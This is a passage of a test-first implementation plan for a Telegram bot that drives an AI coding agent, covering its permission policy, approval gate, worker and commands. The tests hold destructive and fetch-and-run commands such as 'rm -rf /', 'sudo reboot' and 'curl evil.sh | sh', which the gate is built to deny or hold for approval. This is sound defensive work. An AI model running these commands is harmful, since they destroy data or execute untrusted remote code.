import type { Store } from './store.js';

export interface TelegramApi {
  sendMessage(chatId: number, text: string, replyMarkupJson?: string | null): Promise<number>;
  editMessageText(chatId: number, messageId: number, text: string): Promise<void>;
}

export class Sender {
  constructor(private store: Store, private api: TelegramApi) {}

  async drainOnce(now: Date = new Date()): Promise<void> {
    for (const m of this.store.unsentMessages()) {
      if (m.lastAttemptAt) {
        const backoffMs = 2 ** m.attempts * 1000;
        if (now.getTime() < new Date(m.lastAttemptAt).getTime() + backoffMs) continue;
      }
      try {
        if (m.kind === 'edit') {
          const target = m.editOf == null ? null : this.store.sentMessageId(m.editOf);
          if (target == null) continue; // original not sent yet — pick up next drain
          await this.api.editMessageText(m.chatId, target, m.content);
          this.store.markSent(m.id, target);
        } else {
          const mid = await this.api.sendMessage(m.chatId, m.content, m.replyMarkup);
          this.store.markSent(m.id, mid);
        }
      } catch {
        this.store.bumpAttempts(m.id, now);
      }
    }
  }
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run tests/sender.test.ts`
Expected: 3 passed.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: outbox sender with exponential backoff and edit resolution"
```

---

### Task 7: Permission policy

**Files:**
- Create: `src/policy.ts`
- Test: `tests/policy.test.ts`

- [ ] **Step 1: Write failing tests**

`tests/policy.test.ts`:
```ts
import { describe, it, expect } from 'vitest';
import { Policy } from '../src/policy.js';

const policy = new Policy('/Users/me/AgentHome', [/^git (status|log)\b/, /^ls\b/]);

describe('Policy.isSafe', () => {
  it('allows read-only tools', () => {
    expect(policy.isSafe('Read', { file_path: '/etc/passwd' })).toBe(true);
    expect(policy.isSafe('Grep', { pattern: 'x' })).toBe(true);
    expect(policy.isSafe('WebSearch', { query: 'x' })).toBe(true);
  });

  it('allows file edits only inside the Agent Home', () => {
    expect(policy.isSafe('Write', { file_path: '/Users/me/AgentHome/memory/fact.md' })).toBe(true);
    expect(policy.isSafe('Edit', { file_path: '/Users/me/AgentHome/CLAUDE.md' })).toBe(true);
    expect(policy.isSafe('Write', { file_path: '/Users/me/other/x.md' })).toBe(false);
    expect(policy.isSafe('Write', { file_path: '/Users/me/AgentHome/../other/x.md' })).toBe(false);
  });

  it('allows only allowlisted bash commands', () => {
    expect(policy.isSafe('Bash', { command: 'git status' })).toBe(true);
    expect(policy.isSafe('Bash', { command: 'ls -la /tmp' })).toBe(true);
    expect(policy.isSafe('Bash', { command: 'rm -rf /' })).toBe(false);
    expect(policy.isSafe('Bash', { command: 'git status && rm -rf /' })).toBe(false);
  });

  it('allows runtime MCP tools; denies unknown tools by default', () => {
    expect(policy.isSafe('mcp__runtime__schedule_create', { cron: '* * * * *' })).toBe(true);
    expect(policy.isSafe('SomeNewTool', {})).toBe(false);
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run tests/policy.test.ts`
Expected: FAIL — cannot resolve `../src/policy.js`.

- [ ] **Step 3: Implement**

`src/policy.ts`:
```ts
import { isAbsolute, relative, resolve } from 'node:path';
import type { Config } from './config.js';

const READ_ONLY_TOOLS = new Set([
  'Read', 'Glob', 'Grep', 'WebFetch', 'WebSearch', 'TodoWrite', 'NotebookRead', 'Task', 'TaskOutput',
]);
const FILE_EDIT_TOOLS = new Set(['Write', 'Edit', 'MultiEdit', 'NotebookEdit']);

export class Policy {
  constructor(private agentHome: string, private bashAllowlist: RegExp[]) {}

  static fromConfig(cfg: Config): Policy {
    return new Policy(cfg.agentHome, cfg.bashAllowlist.map((s) => new RegExp(s)));
  }

  isSafe(toolName: string, input: Record<string, unknown>): boolean {
    if (READ_ONLY_TOOLS.has(toolName)) return true;
    if (toolName.startsWith('mcp__runtime__')) return true;
    if (FILE_EDIT_TOOLS.has(toolName)) {
      const p = String(input.file_path ?? input.notebook_path ?? '');
      return p !== '' && isInside(this.agentHome, p);
    }
    if (toolName === 'Bash') {
      const cmd = String(input.command ?? '');
      // shell chaining escapes the allowlisted prefix — reject compound commands
      if (/[;&|`$(]/.test(cmd)) return false;
      return this.bashAllowlist.some((r) => r.test(cmd));
    }
    return false;
  }
}

function isInside(parent: string, child: string): boolean {
  const rel = relative(resolve(parent), resolve(child));
  return rel !== '' && !rel.startsWith('..') && !isAbsolute(rel);
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run tests/policy.test.ts`
Expected: 4 passed.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: permission policy (read-only, agent-home edits, bash allowlist)"
```

---

### Task 8: Permission Gate with Telegram approval round-trip

**Files:**
- Create: `src/gate.ts`
- Test: `tests/gate.test.ts`

- [ ] **Step 1: Write failing tests**

`tests/gate.test.ts`:
```ts
import { describe, it, expect, beforeEach } from 'vitest';
import { openDb } from '../src/db.js';
import { Store } from '../src/store.js';
import { Policy } from '../src/policy.js';
import { PermissionGate } from '../src/gate.js';
import type { Task } from '../src/types.js';

let store: Store; let gate: PermissionGate; let task: Task;
beforeEach(() => {
  store = new Store(openDb(':memory:'));
  gate = new PermissionGate(store, new Policy('/home', []), 50); // 50ms timeout for tests
  const id = store.enqueueTask({ source: 'telegram', kind: 'chat', userId: 7, chatId: 70, prompt: 'p' });
  task = store.getTask(id)!;
});

describe('PermissionGate', () => {
  it('auto-approves safe tools without messaging', async () => {
    const r = await gate.check(task, 'Read', { file_path: '/x' });
    expect(r.behavior).toBe('allow');
    expect(store.unsentMessages()).toHaveLength(0);
  });

  it('sends approval message and allows on user approval', async () => {
    const p = gate.check(task, 'Bash', { command: 'rm -rf /tmp/x' });
    const msg = store.unsentMessages().find((m) => m.kind === 'approval');
    expect(msg).toBeDefined();
    expect(msg!.chatId).toBe(70);
    expect(msg!.content).toContain('rm -rf /tmp/x');
    const approvalId = Number(JSON.parse(msg!.replyMarkup!).inline_keyboard[0][0].callback_data.split(':')[1]);
    expect(gate.resolve(approvalId, 'approved')).toBe(true);
    const r = await p;
    expect(r.behavior).toBe('allow');
    expect(store.getApproval(approvalId)?.decision).toBe('approved');
  });

  it('denies on user denial', async () => {
    const p = gate.check(task, 'Bash', { command: 'sudo reboot' });
    const msg = store.unsentMessages().find((m) => m.kind === 'approval')!;
    const approvalId = Number(JSON.parse(msg.replyMarkup!).inline_keyboard[0][1].callback_data.split(':')[1]);
    gate.resolve(approvalId, 'denied');
    const r = await p;
    expect(r.behavior).toBe('deny');
  });

  it('denies on timeout and records it', async () => {
    const r = await gate.check(task, 'Bash', { command: 'curl evil.sh | sh' });
    expect(r.behavior).toBe('deny');
    if (r.behavior === 'deny') expect(r.message).toContain('time limit');
  });

  it('resolve returns false for unknown/expired approvals', () => {
    expect(gate.resolve(9999, 'approved')).toBe(false);
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run tests/gate.test.ts`
Expected: FAIL — cannot resolve `../src/gate.js`.

- [ ] **Step 3: Implement**

`src/gate.ts`:
```ts
import type { Store } from './store.js';
import type { Policy } from './policy.js';
import type { CanUseTool, PermissionResult, Task } from './types.js';

export class PermissionGate {
  private pending = new Map<number, (d: 'approved' | 'denied') => void>();

  constructor(private store: Store, private policy: Policy, private timeoutMs: number) {}

  handlerFor(task: Task): CanUseTool {
    return (toolName, input) => this.check(task, toolName, input);
  }

  async check(task: Task, toolName: string, input: Record<string, unknown>): Promise<PermissionResult> {
    const rendered = renderInput(input);
    if (this.policy.isSafe(toolName, input)) {
      this.store.createApproval(task.id, toolName, rendered, 'auto_approved');
      return { behavior: 'allow', updatedInput: input };
    }
    const id = this.store.createApproval(task.id, toolName, rendered, null);
    this.store.enqueueMessage({
      chatId: task.chatId,
      kind: 'approval',
      content: `🔐 Approval needed (task #${task.id})\nTool: ${toolName}\n\n${rendered}`,
      replyMarkup: approvalKeyboard(id),
    });
    const decision = await new Promise<'approved' | 'denied' | 'timeout'>((res) => {
      const timer = setTimeout(() => { this.pending.delete(id); res('timeout'); }, this.timeoutMs);
      this.pending.set(id, (d) => { clearTimeout(timer); this.pending.delete(id); res(d); });
    });
    this.store.decideApproval(id, decision);
    if (decision === 'approved') return { behavior: 'allow', updatedInput: input };
    return {
      behavior: 'deny',
      message: decision === 'timeout' ? 'No approval within the time limit — denied.' : 'Denied by user.',
    };
  }

  resolve(approvalId: number, decision: 'approved' | 'denied'): boolean {
    const resolver = this.pending.get(approvalId);
    if (!resolver) return false;
    resolver(decision);
    return true;
  }
}

export function approvalKeyboard(approvalId: number): string {
  return JSON.stringify({
    inline_keyboard: [[
      { text: '✅ Approve', callback_data: `apv:${approvalId}:y` },
      { text: '❌ Deny', callback_data: `apv:${approvalId}:n` },
    ]],
  });
}

function renderInput(input: Record<string, unknown>): string {
  return Object.entries(input)
    .map(([k, v]) => `${k}: ${typeof v === 'string' ? v : JSON.stringify(v)}`)
    .join('\n')
    .slice(0, 1500);
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run tests/gate.test.ts`
Expected: 5 passed.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: permission gate with telegram approval round-trip and timeout"
```

---

### Task 9: Claude runner (Agent SDK wrapper)

**Files:**
- Create: `src/claude.ts`, `scripts/try-sdk.ts`
- Test: `tests/claude.test.ts`

The SDK wrapper is thin; the testable core is `mapSdkMessage` (SDK message → `RunEvent`) and `parseResetTime`. A manual script verifies real SDK message shapes and subscription auth.

- [ ] **Step 1: Write failing tests**

`tests/claude.test.ts`:
```ts
import { describe, it, expect } from 'vitest';
import { mapSdkMessage, parseResetTime } from '../src/claude.js';
import { UsageLimitError } from '../src/types.js';

describe('mapSdkMessage', () => {
  it('maps system init to session event', () => {
    expect(mapSdkMessage({ type: 'system', subtype: 'init', session_id: 's1' }))
      .toEqual({ kind: 'session', sessionId: 's1' });
  });

  it('maps assistant text blocks to progress', () => {
    const m = { type: 'assistant', message: { content: [{ type: 'text', text: 'thinking…' }, { type: 'tool_use' }] } };
    expect(mapSdkMessage(m)).toEqual({ kind: 'progress', text: 'thinking…' });
  });

  it('maps successful result to final', () => {
    expect(mapSdkMessage({ type: 'result', subtype: 'success', result: 'done!' }))
      .toEqual({ kind: 'final', text: 'done!' });
  });

  it('throws UsageLimitError on limit errors', () => {
    expect(() => mapSdkMessage({ type: 'result', subtype: 'error_during_execution', result: '5-hour limit reached ∙ resets 6pm' }))
      .toThrow(UsageLimitError);
  });

  it('throws plain Error on other result errors', () => {
    expect(() => mapSdkMessage({ type: 'result', subtype: 'error_max_turns', result: '' })).toThrow(Error);
  });

  it('ignores unknown message types', () => {
    expect(mapSdkMessage({ type: 'user' })).toBeNull();
  });
});

describe('parseResetTime', () => {
  it('parses "resets 6pm" into a future Date', () => {
    const d = parseResetTime('limit reached ∙ resets 6pm', new Date('2026-06-10T10:00:00'));
    expect(d?.getHours()).toBe(18);
  });
  it('returns null when unparseable', () => {
    expect(parseResetTime('limit reached', new Date())).toBeNull();
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run tests/claude.test.ts`
Expected: FAIL — cannot resolve `../src/claude.js`.

- [ ] **Step 3: Implement**

`src/claude.ts`:
```ts
import { query } from '@anthropic-ai/claude-agent-sdk';
import { UsageLimitError, type ClaudeRunner, type RunEvent, type RunRequest } from './types.js';

export class SdkClaudeRunner implements ClaudeRunner {
  async *run(req: RunRequest): AsyncIterable<RunEvent> {
    const abortController = new AbortController();
    req.signal.addEventListener('abort', () => abortController.abort(), { once: true });
    const q = query({
      prompt: req.prompt,
      options: {
        cwd: req.cwd,
        resume: req.resume,
        permissionMode: 'default',
        abortController,
        canUseTool: (toolName: string, input: Record<string, unknown>) => req.canUseTool(toolName, input),
        mcpServers: req.mcpServers as never,
      },
    });
    for await (const m of q) {
      const ev = mapSdkMessage(m as Record<string, unknown>);
      if (ev) yield ev;
    }
  }
}

export function mapSdkMessage(m: any): RunEvent | null {
  if (m.type === 'system' && m.subtype === 'init') return { kind: 'session', sessionId: m.session_id };
  if (m.type === 'assistant') {
    const text = (m.message?.content ?? [])
      .filter((b: any) => b.type === 'text')
      .map((b: any) => b.text)
      .join('\n');
    return text ? { kind: 'progress', text } : null;
  }
  if (m.type === 'result') {
    if (m.subtype === 'success') return { kind: 'final', text: m.result || '(no output)' };
    const errText = `${m.subtype}: ${m.result ?? ''}`;
    if (/limit/i.test(errText)) throw new UsageLimitError(parseResetTime(errText, new Date()));
    throw new Error(`Claude session error — ${errText}`);
  }
  return null;
}

export function parseResetTime(text: string, now: Date): Date | null {
  const m = text.match(/resets?\s+(?:at\s+)?(\d{1,2})(?::(\d{2}))?\s*(am|pm)?/i);
  if (!m) return null;
  let hour = Number(m[1]);
  const minute = m[2] ? Number(m[2]) : 0;
  const ampm = m[3]?.toLowerCase();
  if (ampm === 'pm' && hour < 12) hour += 12;
  if (ampm === 'am' && hour === 12) hour = 0;
  const d = new Date(now);
  d.setHours(hour, minute, 0, 0);
  if (d <= now) d.setDate(d.getDate() + 1);
  return d;
}
```

`scripts/try-sdk.ts` (manual verification — not a unit test):
```ts
import { SdkClaudeRunner } from '../src/claude.js';

const runner = new SdkClaudeRunner();
const ac = new AbortController();
for await (const ev of runner.run({
  prompt: 'Reply with exactly one word: pong',
  cwd: process.env.HOME!,
  signal: ac.signal,
  canUseTool: async (_t, input) => ({ behavior: 'allow', updatedInput: input }),
})) {
  console.log(JSON.stringify(ev));
}
```

- [ ] **Step 4: Run unit tests to verify they pass**

Run: `npx vitest run tests/claude.test.ts`
Expected: 8 passed.

- [ ] **Step 5: Manually verify real SDK shapes and subscription auth**

Precondition: `claude` CLI installed and logged in with the subscription (`claude login` done previously), NO `ANTHROPIC_API_KEY` in env.

Run: `npx tsx scripts/try-sdk.ts`
Expected output: a `session` event, then a `final` event containing "pong".

If the real message shapes differ from `mapSdkMessage`'s assumptions (SDK versions vary), fix `mapSdkMessage` and its tests now — this is the single point where SDK reality is pinned.

- [ ] **Step 6: Commit**

```bash
git add -A && git commit -m "feat: Claude Agent SDK runner with event mapping and limit detection"
```

---

### Task 10: Agent Worker

**Files:**
- Create: `src/worker.ts`, `src/util.ts`
- Test: `tests/worker.test.ts`

- [ ] **Step 1: Write failing tests**

`tests/worker.test.ts`:
```ts
import { describe, it, expect, beforeEach } from 'vitest';
import { openDb } from '../src/db.js';
import { Store } from '../src/store.js';
import { Policy } from '../src/policy.js';
import { PermissionGate } from '../src/gate.js';
import { Worker } from '../src/worker.js';
import { UsageLimitError, type ClaudeRunner, type RunEvent } from '../src/types.js';

function runnerOf(events: RunEvent[] | (() => AsyncGenerator<RunEvent>)): ClaudeRunner {
  return {
    async *run() {
      if (typeof events === 'function') { yield* events(); return; }
      for (const e of events) yield e;
    },
  };
}

let store: Store; let gate: PermissionGate;
beforeEach(() => {
  store = new Store(openDb(':memory:'));
  gate = new PermissionGate(store, new Policy('/home', []), 50);
});

function makeWorker(runner: ClaudeRunner): Worker {
  return new Worker({ store, runner, gate, agentHome: '/home' });
}

function enqueueChat(prompt = 'hello'): number {
  return store.enqueueTask({ source: 'telegram', kind: 'chat', userId: 7, chatId: 70, prompt });
}

describe('Worker', () => {
  it('processes a task: session saved, progress edited, final sent, task done', async () => {
    const w = makeWorker(runnerOf([
      { kind: 'session', sessionId: 's1' },
      { kind: 'progress', text: 'working on it' },
      { kind: 'final', text: 'the answer' },
    ]));
    const id = enqueueChat();
    expect(await w.tick()).toBe(true);
    expect(store.getTask(id)).toMatchObject({ status: 'done', sessionId: 's1' });
    expect(store.getSession(7)?.claudeSessionId).toBe('s1');
    const out = store.unsentMessages();
    expect(out.some((m) => m.kind === 'edit' && m.content.includes('working on it'))).toBe(true);
    expect(out.some((m) => m.content === 'the answer')).toBe(true);
  });

  it('returns false when queue empty', async () => {
    expect(await makeWorker(runnerOf([])).tick()).toBe(false);
  });

  it('pauses and requeues on usage limit, then resumes after reset', async () => {
    let calls = 0;
    const w = makeWorker(runnerOf(async function* () {
      calls++;
      if (calls === 1) throw new UsageLimitError(new Date(Date.now() + 60_000));
      yield { kind: 'final', text: 'ok now' } as RunEvent;
    }));
    const id = enqueueChat();
    await w.tick();
    expect(store.getTask(id)?.status).toBe('queued');
    expect(w.pausedUntil).not.toBeNull();
    expect(store.unsentMessages().some((m) => m.content.includes('usage limit'))).toBe(true);
    expect(await w.tick()).toBe(false); // paused
    w.pausedUntil = new Date(0); // simulate reset passed
    await w.tick();
    expect(store.getTask(id)?.status).toBe('done');
  });

  it('retries once with fresh session on error, then fails with notification', async () => {
    const w = makeWorker(runnerOf(async function* () { throw new Error('corrupt session'); }));
    const id = enqueueChat();
    await w.tick();
    expect(store.getTask(id)?.status).toBe('failed');
    expect(store.unsentMessages().some((m) => m.content.startsWith('❌'))).toBe(true);
  });

  it('recovers when fresh-session retry succeeds', async () => {
    let calls = 0;
    const w = makeWorker(runnerOf(async function* () {
      calls++;
      if (calls === 1) throw new Error('corrupt session');
      yield { kind: 'final', text: 'recovered' } as RunEvent;
    }));
    const id = enqueueChat();
    await w.tick();
    expect(store.getTask(id)?.status).toBe('done');
    expect(store.unsentMessages().some((m) => m.content.includes('context was lost'))).toBe(true);
  });

  it('rotates the session after a rotate-kind task completes', async () => {
    store.setSession(7, 'old-session');
    store.enqueueTask({ source: 'telegram', kind: 'rotate', userId: 7, chatId: 70, prompt: 'save memory' });
    const w = makeWorker(runnerOf([{ kind: 'final', text: 'saved' }]));
    await w.tick();
    expect(store.getSession(7)).toBeUndefined();
  });

  it('cancel aborts only the requesting user\'s running task', async () => {
    let aborted = false;
    const w = makeWorker({
      async *run(req) {
        yield { kind: 'session', sessionId: 's' };
        await new Promise<void>((res) => { req.signal.addEventListener('abort', () => { aborted = true; res(); }); });
        throw new Error('aborted');
      },
    });
    const id = enqueueChat();
    const ticking = w.tick();
    await new Promise((r) => setTimeout(r, 20));
    expect(w.cancel(999)).toBe(false); // not this user's task
    expect(w.cancel(7)).toBe(true);
    await ticking;
    expect(aborted).toBe(true);
    expect(store.getTask(id)?.status).toBe('cancelled');
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run tests/worker.test.ts`
Expected: FAIL — cannot resolve `../src/worker.js`.

- [ ] **Step 3: Implement**

`src/util.ts`:
```ts
export function fmtTime(d: Date): string {
  return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}

export function truncate(s: string, n: number): string {
  return s.length <= n ? s : s.slice(0, n - 1) + '…';
}
```

`src/worker.ts`:
```ts
import type { Store } from './store.js';
import type { PermissionGate } from './gate.js';
import { UsageLimitError, type ClaudeRunner, type Task } from './types.js';
import { fmtTime, truncate } from './util.js';

export interface WorkerDeps {
  store: Store;
  runner: ClaudeRunner;
  gate: PermissionGate;
  agentHome: string;
  mcpServersFor?: (task: Task) => Record<string, unknown>;
}

export class Worker {
  pausedUntil: Date | null = null;
  private current: { task: Task; abort: AbortController } | null = null;

  constructor(private d: WorkerDeps) {}

  cancel(userId: number): boolean {
    if (this.current?.task.userId !== userId) return false;
    this.current.abort.abort();
    return true;
  }

  currentTask(): Task | null {
    return this.current?.task ?? null;
  }

  /** Process at most one task. Returns true if a task was processed. */
  async tick(now: Date = new Date()): Promise<boolean> {
    if (this.pausedUntil && now < this.pausedUntil) return false;
    this.pausedUntil = null;
    const task = this.d.store.claimNextTask();
    if (!task) return false;
    await this.process(task);
    return true;
  }

  private async process(task: Task): Promise<void> {
    const abort = new AbortController();
    this.current = { task, abort };
    const statusId = this.d.store.enqueueMessage({ chatId: task.chatId, content: '🤔 Working…' });
    try {
      const final = await this.runOnce(task, abort.signal, true, statusId);
      this.complete(task, final, null);
    } catch (e) {
      if (abort.signal.aborted) {
        this.d.store.finishTask(task.id, 'cancelled');
        this.d.store.enqueueMessage({ chatId: task.chatId, content: '🛑 Task cancelled.' });
      } else if (e instanceof UsageLimitError) {
        this.pausedUntil = e.resetAt ?? new Date(Date.now() + 30 * 60_000);
        this.d.store.requeueTask(task.id);
        this.d.store.enqueueMessage({
          chatId: task.chatId,
          content: `⚠️ Subscription usage limit reached — your task is paused and will resume around ${fmtTime(this.pausedUntil)}.`,
        });
      } else {
        await this.retryFresh(task, abort, statusId, e);
      }
    } finally {
      this.current = null;
    }
  }

  private async retryFresh(task: Task, abort: AbortController, statusId: number, firstError: unknown): Promise<void> {
    try {
      const final = await this.runOnce(task, abort.signal, false, statusId);
      this.complete(task, final, '⚠️ Previous conversation context was lost due to a session error.');
    } catch (e2) {
      const err = e2 instanceof UsageLimitError ? e2 : e2 ?? firstError;
      this.d.store.finishTask(task.id, 'failed', truncate(String(err), 500));
      this.d.store.enqueueMessage({ chatId: task.chatId, content: `❌ Task failed: ${truncate(String(err), 300)}` });
    }
  }

  private complete(task: Task, final: string, prefixNote: string | null): void {
    const content = prefixNote ? `${prefixNote}\n\n${final}` : final;
    this.d.store.enqueueMessage({ chatId: task.chatId, content });
    this.d.store.finishTask(task.id, 'done', truncate(final, 500));
    if (task.kind === 'rotate') this.d.store.rotateSession(task.userId);
  }

  private async runOnce(task: Task, signal: AbortSignal, useResume: boolean, statusId: number): Promise<string> {
    const session = useResume ? this.d.store.getSession(task.userId) : undefined;
    let final = '';
    for await (const ev of this.d.runner.run({
      prompt: task.prompt,
      cwd: this.d.agentHome,
      resume: session?.claudeSessionId,
      signal,
      canUseTool: this.d.gate.handlerFor(task),
      mcpServers: this.d.mcpServersFor?.(task),
    })) {
      if (ev.kind === 'session') {
        this.d.store.setSession(task.userId, ev.sessionId);
        this.d.store.attachSession(task.id, ev.sessionId);
      } else if (ev.kind === 'progress') {
        this.d.store.enqueueEdit(statusId, `⏳ ${truncate(ev.text, 300)}`);
      } else if (ev.kind === 'final') {
        final = ev.text;
      }
    }
    return final;
  }
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run tests/worker.test.ts`
Expected: 7 passed.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: sequential agent worker with limit pause, retry, cancel, rotation"
```

---

### Task 11: Intake + chat commands

**Files:**
- Create: `src/intake.ts`, `src/commands.ts`
- Test: `tests/commands.test.ts`

- [ ] **Step 1: Write failing tests**

`tests/commands.test.ts`:
```ts
import { describe, it, expect, beforeEach } from 'vitest';
import { openDb } from '../src/db.js';
import { Store } from '../src/store.js';
import { intakeMessage } from '../src/intake.js';
import { statusText, queueText, newConversation, schedulesText, ROTATE_PROMPT } from '../src/commands.js';

let store: Store;
beforeEach(() => { store = new Store(openDb(':memory:')); });

describe('intakeMessage', () => {
  it('persists update then enqueues a chat task', () => {
    const r = intakeMessage(store, { updateId: 1, userId: 7, chatId: 70, text: 'do thing' });
    expect(r.queued).toBe(true);
    expect(store.getTask(r.taskId!)).toMatchObject({ kind: 'chat', userId: 7, chatId: 70, prompt: 'do thing' });
  });

  it('ignores duplicate update_ids (redelivery)', () => {
    intakeMessage(store, { updateId: 1, userId: 7, chatId: 70, text: 'x' });
    const r = intakeMessage(store, { updateId: 1, userId: 7, chatId: 70, text: 'x' });
    expect(r.queued).toBe(false);
    expect(store.pendingTasks()).toHaveLength(1);
  });
});

describe('commands', () => {
  it('statusText reports idle and queue depth', () => {
    const fakeWorker = { pausedUntil: null, currentTask: () => null } as any;
    const s = statusText(store, fakeWorker, new Date(Date.now() - 120_000));
    expect(s).toContain('Idle');
    expect(s).toContain('Queued: 0');
  });

  it('statusText reports running task and pause', () => {
    store.enqueueTask({ source: 'telegram', kind: 'chat', userId: 7, chatId: 70, prompt: 'long job' });
    const t = store.claimNextTask()!;
    const fakeWorker = { pausedUntil: new Date(), currentTask: () => t } as any;
    const s = statusText(store, fakeWorker, new Date());
    expect(s).toContain('long job');
    expect(s).toContain('usage limit');
  });

  it('queueText lists queued tasks', () => {
    store.enqueueTask({ source: 'telegram', kind: 'chat', userId: 7, chatId: 70, prompt: 'first thing to do' });
    expect(queueText(store)).toContain('first thing to do');
  });

  it('newConversation enqueues a rotate task with the rotation prompt', () => {
    const id = newConversation(store, 7, 70);
    expect(store.getTask(id)).toMatchObject({ kind: 'rotate', prompt: ROTATE_PROMPT });
  });

  it('schedulesText lists schedules', () => {
    store.createSchedule({ cronExpr: '0 8 * * 1', prompt: 'weekly review', missedPolicy: 'skip', createdByUserId: 7, chatId: 70 });
    const s = schedulesText(store);
    expect(s).toContain('0 8 * * 1');
    expect(s).toContain('weekly review');
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run tests/commands.test.ts`
Expected: FAIL — cannot resolve `../src/intake.js`.

- [ ] **Step 3: Implement**

`src/intake.ts`:
```ts
import type { Store } from './store.js';

export function intakeMessage(
  store: Store,
  u: { updateId: number; userId: number; chatId: number; text: string },
): { queued: boolean; taskId?: number } {
  if (!store.recordUpdate(u.updateId, JSON.stringify(u))) return { queued: false };
  const taskId = store.enqueueTask({ source: 'telegram', kind: 'chat', userId: u.userId, chatId: u.chatId, prompt: u.text });
  store.markProcessed(u.updateId);
  return { queued: true, taskId };
}
```

`src/commands.ts`:
```ts
import type { Store } from './store.js';
import type { Worker } from './worker.js';
import { fmtTime, truncate } from './util.js';

export const ROTATE_PROMPT =
  'We are rotating to a fresh conversation. Review this conversation and write any durable facts, ' +
  'preferences, or unfinished business into the memory/ directory (create or update files). ' +
  'Reply with a one-line confirmation of what you saved.';

export function statusText(store: Store, worker: Worker, startedAt: Date, now: Date = new Date()): string {
  const upMin = Math.floor((now.getTime() - startedAt.getTime()) / 60_000);
  const running = worker.currentTask();
  const queued = store.pendingTasks().filter((t) => t.status === 'queued');
  const pause = worker.pausedUntil ? `\n⏸ Paused until ${fmtTime(worker.pausedUntil)} (usage limit)` : '';
  const head = running ? `▶️ Running #${running.id}: ${truncate(running.prompt, 80)}` : '💤 Idle';
  return `🟢 Up ${upMin}m\n${head}\nQueued: ${queued.length}${pause}`;
}

export function queueText(store: Store): string {
  const queued = store.pendingTasks().filter((t) => t.status === 'queued');
  if (queued.length === 0) return 'Queue is empty.';
  return queued.map((t) => `#${t.id} — ${truncate(t.prompt, 60)}`).join('\n');
}

export function newConversation(store: Store, userId: number, chatId: number): number {
  return store.enqueueTask({ source: 'telegram', kind: 'rotate', userId, chatId, prompt: ROTATE_PROMPT });
}

export function schedulesText(store: Store): string {
  const all = store.listSchedules();
  if (all.length === 0) return 'No schedules. Ask me to create one, e.g. "every morning at 8 summarize my email".';
  return all
    .map((s) => `#${s.id} [${s.cronExpr}] ${truncate(s.prompt, 60)} (${s.missedPolicy}${s.enabled ? '' : ', disabled'})`)
    .join('\n');
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run tests/commands.test.ts`
Expected: 7 passed.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: message intake with dedup and chat commands"
```

---

### Task 12: Telegram bot wiring (grammY)

**Files:**
- Create: `src/telegram.ts`
- Test: `tests/telegram.test.ts`

grammY wiring is thin glue; the testable parts are the whitelist middleware and the callback handlers, exercised as plain functions with fake `ctx` objects. Handler registration order matters: commands BEFORE the generic `message:text` handler (grammY runs handlers in registration order).

- [ ] **Step 1: Write failing tests**

`tests/telegram.test.ts`:
```ts
import { describe, it, expect, beforeEach } from 'vitest';
import { openDb } from '../src/db.js';
import { Store } from '../src/store.js';
import { Policy } from '../src/policy.js';
import { PermissionGate } from '../src/gate.js';
import { whitelistMiddleware, handleApprovalCallback, handleResumeCallback } from '../src/telegram.js';

let store: Store; let gate: PermissionGate;
beforeEach(() => {
  store = new Store(openDb(':memory:'));
  gate = new PermissionGate(store, new Policy('/home', []), 50);
});

describe('whitelistMiddleware', () => {
  const mw = whitelistMiddleware([11, 22]);

  it('passes whitelisted users through', async () => {
    let called = false;
    await mw({ from: { id: 11 } } as any, async () => { called = true; });
    expect(called).toBe(true);
  });

  it('drops unknown users and missing from', async () => {
    let called = false;
    await mw({ from: { id: 99 } } as any, async () => { called = true; });
    await mw({ from: undefined } as any, async () => { called = true; });
    expect(called).toBe(false);
  });
});

describe('handleApprovalCallback', () => {
  it('resolves a pending approval', async () => {
    const tid = store.enqueueTask({ source: 'telegram', kind: 'chat', userId: 11, chatId: 11, prompt: 'p' });
    const task = store.getTask(tid)!;
    const pending = gate.check(task, 'Bash', { command: 'sudo x' });
    const approvalMsg = store.unsentMessages().find((m) => m.kind === 'approval')!;
    const approvalId = Number(JSON.parse(approvalMsg.replyMarkup!).inline_keyboard[0][0].callback_data.split(':')[1]);
    const answers: string[] = [];
    const ctx = {
      match: [`apv:${approvalId}:y`, String(approvalId), 'y'],
      answerCallbackQuery: async (o: any) => { answers.push(o.text); },
      editMessageReplyMarkup: async () => {},
    } as any;
    await handleApprovalCallback(gate, ctx);
    expect((await pending).behavior).toBe('allow');
    expect(answers[0]).toContain('Recorded');
  });
});

describe('handleResumeCallback', () => {
  it('re-enqueues an interrupted task with its session intact', async () => {
    const tid = store.enqueueTask({ source: 'telegram', kind: 'chat', userId: 11, chatId: 11, prompt: 'long job' });
    store.claimNextTask();
    store.markInterruptedOnStartup();
    const answers: string[] = [];
    const ctx = {
      match: [`rsm:${tid}`, String(tid)],
      answerCallbackQuery: async (o: any) => { answers.push(o.text); },
    } as any;
    await handleResumeCallback(store, ctx);
    const queued = store.pendingTasks().filter((t) => t.status === 'queued');
    expect(queued).toHaveLength(1);
    expect(queued[0].kind).toBe('resume');
    expect(answers[0]).toContain('Resuming');
  });

  it('rejects non-interrupted tasks', async () => {
    const answers: string[] = [];
    await handleResumeCallback(store, {
      match: ['rsm:999', '999'],
      answerCallbackQuery: async (o: any) => { answers.push(o.text); },
    } as any);
    expect(answers[0]).toContain('Not resumable');
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run tests/telegram.test.ts`
Expected: FAIL — cannot resolve `../src/telegram.js`.

- [ ] **Step 3: Implement**

`src/telegram.ts`:
```ts
